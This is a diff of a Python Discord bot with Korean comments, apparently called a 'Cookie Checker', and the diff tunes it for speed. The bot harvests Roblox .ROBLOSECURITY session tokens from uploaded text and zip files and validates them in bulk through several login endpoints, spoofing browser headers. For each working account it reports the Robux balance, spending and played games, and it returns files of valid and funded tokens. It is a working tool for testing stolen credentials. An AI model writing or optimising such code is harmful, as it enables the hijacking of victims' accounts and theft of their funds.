@@ -14,26 +14,28 @@ GUILD_ID = os.getenv("GUILD_ID")  # 선택
 MENU_PUBLIC = True
 RESULTS_EPHEMERAL = True
 
-# 성능/안정 밸런스
-FAST_MODE = True  # True면 더 빠르게(지출 1p, 배지 50개)
+# 속도 우선(1분 내 목표)
+FAST_MODE = True  # True: 지출 1p, 배지 30개
 CHUNK_SIZE = 500
-CONCURRENCY_AUTH = 10
-CONCURRENCY_BADGE = 6
-CONCURRENCY_ECON = 8
+CONCURRENCY_AUTH = 12
+CONCURRENCY_BADGE = 8
+CONCURRENCY_ECON = 10
+MULTI_FILE_CONCURRENCY = 4
+BIND_ATTACHMENTS = True  # 여러 첨부를 합쳐 한 번에 파이프 태움
 MAX_TOTAL = 0
 MAX_TRX_PAGES = 1 if FAST_MODE else 10
 
 # ========================
 # 네트워크
 # ========================
-AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, sock_connect=5, sock_read=20)
+AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=20, sock_connect=4, sock_read=12)
 TCP_CONN: aiohttp.TCPConnector | None = None
 
 def new_session(cookies=None):
     global TCP_CONN
     if TCP_CONN is None:
         TCP_CONN = aiohttp.TCPConnector(
-            limit=0, limit_per_host=20, ttl_dns_cache=300, enable_cleanup_closed=True
+            limit=0, limit_per_host=40, ttl_dns_cache=300, enable_cleanup_closed=True
         )
     return aiohttp.ClientSession(
         timeout=AIOHTTP_TIMEOUT,
@@ -50,12 +52,12 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
             async with session.request(method, url, **kw) as r:
                 if r.status == 429:
                     ra = r.headers.get("Retry-After")
-                    wait = float(ra) if ra else min(2 ** tries, 10) + random.random()
+                    wait = float(ra) if ra else min(2 ** tries, 6) + random.random()
                     await asyncio.sleep(wait)
-                    if tries < 5:
+                    if tries < 4:
                         continue
-                if 500 <= r.status < 600 and tries < 4:
-                    await asyncio.sleep(min(2 ** tries, 6) + random.random())
+                if 500 <= r.status < 600 and tries < 3:
+                    await asyncio.sleep(min(2 ** tries, 4) + random.random())
                     continue
                 if r.status >= 400:
                     try:
@@ -65,14 +67,16 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
                     return r.status, data
                 return r.status, await r.json()
         except Exception as e:
-            if tries >= 4:
+            if tries >= 3:
                 return 599, {"error": f"{type(e).__name__}: {e}"}
-            await asyncio.sleep(min(2 ** tries, 5) + random.random())
+            await asyncio.sleep(min(2 ** tries, 3) + random.random())
 
 # ========================
-# UI/공통
+# 공통 UI/포맷
 # ========================
 COLOR_BASE = discord.Color.from_rgb(0, 0, 0)
+COLOR_BLUE = discord.Color.blurple()
+
 def make_embed(title: str | None = None, desc: str = "", color: discord.Color = COLOR_BASE) -> discord.Embed:
     emb = discord.Embed(description=desc, color=color)
     if title:
@@ -80,13 +84,10 @@ def make_embed(title: str | None = None, desc: str = "", color: discord.Color = 
     return emb
 
 def fmt_num(n: int | float) -> str:
-    try:
-        return f"{int(n):,}"
+    try: return f"{int(n):,}"
     except:
-        try:
-            return f"{float(n):,.2f}"
-        except:
-            return str(n)
+        try: return f"{float(n):,.2f}"
+        except: return str(n)
 
 def fmt_rbx(n: int | float) -> str:
     return f"{fmt_num(n)} R$"
@@ -102,7 +103,7 @@ def main_menu_embed() -> discord.Embed:
     )
 
 # ========================
-# 게임 프리셋
+# 게임 프리셋(이름만 사용: 이모지 제거)
 # ========================
 GAMES = {
     "그로우 어 가든": {"key":"grow_a_garden", "universeId":7436755782, "welcomeBadgeIds":[]},
@@ -112,142 +113,107 @@ GAMES = {
 }
 
 # ========================
-# 파일/토큰 인식(강화)
+# 파일/토큰 인식(강화: Order 파일 패턴 + 백업 패턴)
 # ========================
 SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
 SUPPORTED_ARCHIVE_EXT = {".zip"}
 
+# Order 파일 같은 라인 내 반복 토큰 인식
+ORDER_TOKEN_RE = re.compile(r"(_\|WARNING[^\s\"';]+)")
+
+# 백업 패턴(.ROBLOSECURITY, 헤더, JSON)
 COOKIE_PATTERNS = [
-    r"(_?\|WARNING[^\s\"';]+)",                           # _|WARNING… 또는 |WARNING…
-    r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)",        # .ROBLOSECURITY=값
-    r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\"",          # "ROBLOSECURITY":"값"
-    r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)",  # 헤더형
+    re.compile(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)"),
+    re.compile(r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\""),
+    re.compile(r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)"),
 ]
 
-def extract_cookie_variants(s: str):
-    if not s:
-        return None, None
-    s = s.strip()
-    m_w = re.search(r"(_?\|WARNING[^\s;]+)", s)
-    if m_w:
-        token = m_w.group(1).strip()
-        return token, token
-    m_eq = re.search(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s;]+)", s)
-    if m_eq:
-        val = m_eq.group(1).strip()
-        if "|WARNING" in val:
-            out = val[val.find("|WARNING"):]
-        elif "_|WARNING" in val:
-            out = val[val.find("_|WARNING"):]
-        else:
-            out = val
-        return val, out
-    if len(s) > 50 and " " not in s and "\n" not in s and "\t" not in s:
-        if "|WARNING" in s:
-            token = s[s.find("|WARNING"):]
-            return token, token
-        if "_|WARNING" in s:
-            token = s[s.find("_|WARNING"):]
-            return token, token
-        return s, s
-    return None, None
+def _clean_token(v: str) -> str:
+    return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()
 
-def find_tokens_in_text(text: str):
-    out, seen = [], set()
-    for pat in COOKIE_PATTERNS:
-        for m in re.finditer(pat, text or ""):
-            val = m.group(1).strip()
-            if "|WARNING" in val:
-                auth = val[val.find("|WARNING"):]
-            elif "_|WARNING" in val:
-                auth = val[val.find("_|WARNING"):]
-            else:
-                auth = val
-            if auth not in seen:
-                seen.add(auth)
-                out.append((auth, auth))
-    for line in (text or "").splitlines():
-        auth, outv = extract_cookie_variants(line)
-        if auth and (auth, outv) not in out:
-            out.append((auth, outv))
+def extract_tokens_from_order_text(text: str) -> list[str]:
+    if not text: return []
+    return [_clean_token(m.group(1)) for m in ORDER_TOKEN_RE.finditer(text)]
+
+def extract_tokens_fallback(text: str) -> list[str]:
+    out = []
+    # 1) _|WARNING 우선
+    out.extend(extract_tokens_from_order_text(text))
+    # 2) 백업 패턴들
+    for rgx in COOKIE_PATTERNS:
+        for m in rgx.finditer(text or ""):
+            raw = _clean_token(m.group(1))
+            if "_|WARNING" in raw:
+                raw = raw[raw.find("_|WARNING"):]
+            if raw:
+                out.append(raw)
     return out
 
-def find_warning_tokens(text: str) -> list[tuple[str, str]]:
-    out, seen = [], set()
-    for m in re.finditer(r"(_?\|WARNING[^\s\"';]+)", text or ""):
-        tok = m.group(1).strip()
+def parse_cookies_blob(raw_text: str) -> list[tuple[str, str]]:
+    tokens = extract_tokens_fallback(raw_text or "")
+    seen = set()
+    pairs = []
+    for tok in tokens:
+        tok = _clean_token(tok)
+        if not tok: continue
+        if any(ch.isspace() for ch in tok):  # 공백 포함 제거
+            continue
         if tok not in seen:
             seen.add(tok)
-            out.append((tok, tok))
-    return out
-
-def extract_fallback_tokens(text: str) -> list[tuple[str, str]]:
-    return find_tokens_in_text(text or "")
-
-def parse_cookies_blob(raw: str) -> list[tuple[str, str]]:
-    primary = find_warning_tokens(raw or "")
-    if primary:
-        return primary
-    return extract_fallback_tokens(raw or "")
+            pairs.append((tok, tok))
+    return pairs
 
 async def extract_texts_from_attachment(att: discord.Attachment):
     name = (att.filename or "file").lower()
     data = await att.read()
     texts = []
     def dec(b: bytes):
-        try:
-            return b.decode("utf-8")
-        except:
-            return b.decode("utf-8", errors="ignore")
+        try: return b.decode("utf-8")
+        except: return b.decode("utf-8", errors="ignore")
     if any(name.endswith(ext) for ext in SUPPORTED_ARCHIVE_EXT):
         with zipfile.ZipFile(io.BytesIO(data)) as zf:
             for info in zf.infolist():
-                if info.is_dir():
-                    continue
+                if info.is_dir(): continue
                 lname = info.filename.lower()
-                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT):
-                    continue
-                if info.file_size > 10 * 1024 * 1024:
-                    continue
+                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT): continue
+                if info.file_size > 8 * 1024 * 1024: continue
                 with zf.open(info, "r") as f:
                     texts.append(dec(f.read()))
         return texts or [dec(data)], "zip"
     return [dec(data)], "text"
 
 # ========================
-# 인증/데이터 조회
+# 인증/데이터 조회(성공률 최우선 3단계)
 # ========================
 async def check_cookie_once(cookie_value: str):
-    # UA + 3단계 폴백(users → settings → mobileapi)
+    # UA + 3단계: settings → mobileapi → users
     UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
-    token = (cookie_value or "").replace("\u200b", "").replace("\ufeff", "").strip()
+    HDR = {
+        "User-Agent": UA,
+        "Referer": "https://www.roblox.com/",
+        "Origin": "https://www.roblox.com",
+        "Accept": "application/json, text/plain, */*",
+        "Connection": "keep-alive",
+    }
+    token = _clean_token(cookie_value)
     try:
         async with new_session(cookies={'.ROBLOSECURITY': token}) as s:
-            st1, data1 = await fetch_json_with_retry(
-                s, "GET", "https://users.roblox.com/v1/users/authenticated",
-                headers={"User-Agent": UA}
-            )
-            if st1 == 200 and isinstance(data1, dict) and data1.get("id"):
-                return True, None, int(data1["id"]), data1.get("name") or data1.get("displayName")
+            stA, dataA = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/my/settings/json", headers=HDR)
+            if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
+                return True, None, None, dataA.get("Name") or dataA.get("UserName")
 
-            st2, data2 = await fetch_json_with_retry(
-                s, "GET", "https://www.roblox.com/my/settings/json",
-                headers={"User-Agent": UA, "Referer": "https://www.roblox.com/"}
-            )
-            if st2 == 200 and isinstance(data2, dict) and data2.get("Name"):
-                return True, None, None, data2.get("Name")
-
-            st3, data3 = await fetch_json_with_retry(
-                s, "GET", "https://www.roblox.com/mobileapi/userinfo",
-                headers={"User-Agent": UA, "Referer": "https://www.roblox.com/"}
-            )
-            if st3 == 200 and isinstance(data3, dict) and (data3.get("UserID") or data3.get("UserName")):
-                uid = data3.get("UserID")
-                uname = data3.get("UserName") or data3.get("UserDisplayName")
+            stB, dataB = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=HDR)
+            if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
+                uid = dataB.get("UserID")
+                uname = dataB.get("UserName") or dataB.get("UserDisplayName")
                 return True, None, (int(uid) if uid else None), uname
 
-            bad = st1 or st2 or st3
+            stC, dataC = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated", headers=HDR)
+            if stC == 200 and isinstance(dataC, dict) and dataC.get("id"):
+                return True, None, int(dataC["id"]), dataC.get("name") or dataC.get("displayName")
+
+            bad = stA or stB or stC
             if bad in (401, 403):
                 return False, None, None, None
             return False, f"unexpected {bad}", None, None
@@ -268,25 +234,21 @@ async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: i
     while True:
         url = base + (f"&cursor={cursor}" if cursor else "")
         st, data = await fetch_json_with_retry(session, "GET", url)
-        if st != 200 or not isinstance(data, dict):
-            break
+        if st != 200: break
         out.extend(data.get("data", []))
         cursor = data.get("nextPageCursor")
-        if not cursor or len(out) >= fetch_limit:
-            break
+        if not cursor or len(out) >= fetch_limit: break
     return out[:fetch_limit]
 
 async def get_played_games_for_user(user_id: int, auth_cookie: str):
-    # 배지 기반 게임 감지
     played = set()
     try:
         async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
-            badges = await get_user_badges(user_id, s, limit=(50 if FAST_MODE else 100))
+            badges = await get_user_badges(user_id, s, limit=(30 if FAST_MODE else 100))
             uni_by_key = {cfg["key"]: int(cfg["universeId"]) for _, cfg in GAMES.items() if cfg.get("universeId")}
             for b in badges:
                 uni = b.get("awardingUniverse")
-                if not isinstance(uni, dict):
-                    continue
+                if not isinstance(uni, dict): continue
                 uid = int(uni.get("id") or 0)
                 for k, u in uni_by_key.items():
                     if u == uid:
@@ -297,8 +259,7 @@ async def get_played_games_for_user(user_id: int, auth_cookie: str):
 
 async def fetch_robux_balance(user_id: int, session: aiohttp.ClientSession) -> int:
     st, data = await fetch_json_with_retry(session, "GET", f"https://economy.roblox.com/v1/users/{user_id}/currency")
-    if st == 200 and isinstance(data, dict):
-        return int(data.get("robux", 0))
+    if st == 200 and isinstance(data, dict): return int(data.get("robux", 0))
     return 0
 
 async def sum_total_spend(user_id: int, session: aiohttp.ClientSession, max_pages: int = MAX_TRX_PAGES) -> int:
@@ -307,15 +268,13 @@ async def sum_total_spend(user_id: int, session: aiohttp.ClientSession, max_page
     while pages < max_pages:
         url = base + (f"&cursor={cursor}" if cursor else "")
         st, data = await fetch_json_with_retry(session, "GET", url)
-        if st != 200 or not isinstance(data, dict):
-            break
+        if st != 200 or not isinstance(data, dict): break
         for row in data.get("data", []):
             amt = int(row.get("amount", 0))
             total += abs(amt)
         cursor = data.get("nextPageCursor")
         pages += 1
-        if not cursor:
-            break
+        if not cursor: break
     return total
 
 async def get_robux_and_spend(user_id: int, auth_cookie: str) -> tuple[int, int]:
@@ -330,7 +289,7 @@ async def get_robux_and_spend(user_id: int, auth_cookie: str) -> tuple[int, int]
         return 0, 0
 
 # ========================
-# 처리 도우미
+# 처리 도우미/청크
 # ========================
 def chunked(seq, n):
     for i in range(0, len(seq), n):
@@ -358,7 +317,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
         # 1) 인증(동시)
         auth_results = await bulk_authenticate(part)
 
-        # 성공 기준: ok면 uid 없어도 성공(카운트/valid 파일 포함)
+        # 성공: ok면 uid 없어도 성공(카운트/valid 파일 포함)
         valid_tokens: list[str] = []
         ok_entries: list[tuple[str, str, int, str]] = []  # uid 있는 계정만 (게임/경제용)
         for (auth, outv), res in zip(part, auth_results):
@@ -400,7 +359,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
                 if bal > 0:
                     robux_positive_list.append(outv)
 
-        # 4) 파일 첨부
+        # 4) 파일 첨부(필요한 것만)
         files: list[discord.File] = []
         if valid_tokens:
             buf_valid = io.BytesIO(("\n".join(valid_tokens)).encode("utf-8"))
@@ -409,11 +368,10 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
             buf_pos = io.BytesIO(("\n".join(robux_positive_list)).encode("utf-8"))
             files.append(discord.File(buf_pos, filename=f"robux_positive_part{chunk_idx}.txt"))
 
-        # 임베드
+        # 임베드(이모지 없이 깔끔)
         elapsed_chunk = time.perf_counter() - t0_chunk
-        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}
 
-        # 게임플레이(텍스트만)
+        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}
         order = ["grow_a_garden", "adopt_me", "brainrot", "blox_fruits"]
         pretty_lines = []
         for k in order:
@@ -474,7 +432,7 @@ async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
         await dm.send(embed=emb, files=files or None)
 
 # ========================
-# 전체조회(여러 줄 넣어도 유효한 첫 쿠키 자동 선택)
+# 전체조회(유효한 첫 쿠키 자동 선택)
 # ========================
 class TotalCheckModal(Modal, title="전체 조회"):
     cookie = TextInput(
@@ -487,12 +445,10 @@ class TotalCheckModal(Modal, title="전체 조회"):
     async def on_submit(self, inter: Interaction):
         await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)
         try:
-            await inter.followup.send(embed=make_embed("진행 중", "계정 정보를 조회 중입니다.", color=discord.Color.blurple()), ephemeral=True)
-
             pairs = parse_cookies_blob(self.cookie.value)
             if not pairs:
                 return await inter.followup.send(
-                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다.", color=discord.Color.blurple()),
+                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다.", color=COLOR_BLUE),
                     ephemeral=True
                 )
 
@@ -509,7 +465,7 @@ class TotalCheckModal(Modal, title="전체 조회"):
 
             if not valid_cookie:
                 return await inter.followup.send(
-                    embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=discord.Color.blurple()),
+                    embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=COLOR_BLUE),
                     ephemeral=True
                 )
 
@@ -518,11 +474,11 @@ class TotalCheckModal(Modal, title="전체 조회"):
             async with new_session(cookies={'.ROBLOSECURITY': valid_cookie}) as s:
                 st, data = await fetch_json_with_retry(
                     s, "GET", "https://users.roblox.com/v1/users/authenticated",
-                    headers={"User-Agent": UA}
+                    headers={"User-Agent": UA, "Referer": "https://www.roblox.com/", "Origin": "https://www.roblox.com"}
                 )
                 if st != 200 or not data.get("id"):
                     return await inter.followup.send(
-                        embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=discord.Color.blurple()),
+                        embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=COLOR_BLUE),
                         ephemeral=True
                     )
                 user_id = data["id"]
@@ -536,25 +492,23 @@ class TotalCheckModal(Modal, title="전체 조회"):
                 settings_task = asyncio.create_task(fj('https://www.roblox.com/my/settings/json'))
                 thumb_task = asyncio.create_task(fj(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}'))
                 spend_task = asyncio.create_task(sum_total_spend(user_id, s, MAX_TRX_PAGES))
-
                 robux, credit, settings, thumb, total_spend = await asyncio.gather(
                     robux_task, credit_task, settings_task, thumb_task, spend_task
                 )
 
-            emb = make_embed(title="전체 조회", color=discord.Color.blurple())
+            emb = make_embed(title="전체 조회", color=COLOR_BLUE)
             emb.set_thumbnail(url=(thumb.get('data', [{}])[0].get('imageUrl') or discord.Embed.Empty))
             emb.add_field(name="로벅스", value=f"{robux.get('robux', 0)} R$", inline=True)
             emb.add_field(name="전체 지출 합계", value=f"{total_spend} R$", inline=True)
             emb.add_field(name="크레딧", value=f"{credit.get('balance', 0)} {credit.get('currencyCode', '')}", inline=True)
             emb.add_field(name="닉네임", value=str(settings.get('Name')), inline=True)
-
             await inter.followup.send(embed=emb, ephemeral=True)
 
         except Exception as e:
-            await inter.followup.send(embed=make_embed("요청 실패", f"{type(e).__name__}: {e}", color=discord.Color.blurple()), ephemeral=True)
+            await inter.followup.send(embed=make_embed("요청 실패", f"{type(e).__name__}: {e}", color=COLOR_BLUE), ephemeral=True)
 
 # ========================
-# DM 파일검증 뷰
+# DM 파일검증 뷰(쓸모없는 임베드 제거 + 대량 인증 바인딩)
 # ========================
 class DMFilePromptView(discord.ui.View):
     def __init__(self, bot: commands.Bot):
@@ -595,17 +549,24 @@ class DMFilePromptView(discord.ui.View):
             self.busy = False
             return await dm.send(embed=make_embed("첨부 없음", "파일이 비어있어. 다시 올려줘!", color=COLOR_BASE))
 
-        await dm.send(embed=make_embed("진행 중", f"파일 {len(atts)}개 받음. 처리 시작!", color=COLOR_BASE))
-
         try:
-            for att in atts:
-                t0 = time.perf_counter()
-                texts, _ = await extract_texts_from_attachment(att)
-                combined = "\n\n".join(texts)
+            if BIND_ATTACHMENTS and len(atts) > 1:
+                # 첨부 병렬 읽기 → 합쳐서 한 번에 파이프
+                async def read_one(att: discord.Attachment):
+                    texts, _ = await extract_texts_from_attachment(att)
+                    return "\n\n".join(texts)
+                all_texts = await asyncio.gather(*[read_one(a) for a in atts])
+                combined = "\n\n".join(all_texts)
                 await handle_file_check_logic_dm(dm, combined)
-                t_total = time.perf_counter() - t0
-                await dm.send(embed=make_embed("개별 파일 처리 완료", f"{att.filename} • {fmt_sec(t_total)}", color=COLOR_BASE))
-            await dm.send(embed=make_embed("메시지 내 모든 파일 처리 완료", "요청한 모든 첨부 처리 끝!", color=COLOR_BASE))
+            else:
+                # 단일/소수 첨부는 기존 파이프 (동시 파일 처리)
+                sem_files = asyncio.Semaphore(MULTI_FILE_CONCURRENCY)
+                async def process_one(att: discord.Attachment):
+                    async with sem_files:
+                        texts, _ = await extract_texts_from_attachment(att)
+                        combined = "\n\n".join(texts)
+                        await handle_file_check_logic_dm(dm, combined)
+                await asyncio.gather(*[process_one(a) for a in atts])
         except Exception as e:
             await dm.send(embed=make_embed("처리 실패", f"{type(e).__name__}: {e}", color=COLOR_BASE))
         finally:
@@ -661,7 +622,7 @@ async def on_ready():
         print("[VIEW] persistent CheckView 등록 완료")
     except Exception as e:
         print("[VIEW] 등록 실패:", e)
-    print("[VER] ua=ON, auth=3step, parse=WARNING/_|WARNING, valid=ok(any), uidOnlyForEcon")
+    print("[VER] fast=ON, bind=ON, auth=3step(settings->mobile->users), parse=WARNING/_|WARNING, valid=ok(any), uidOnlyForEcon")
     print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))
 
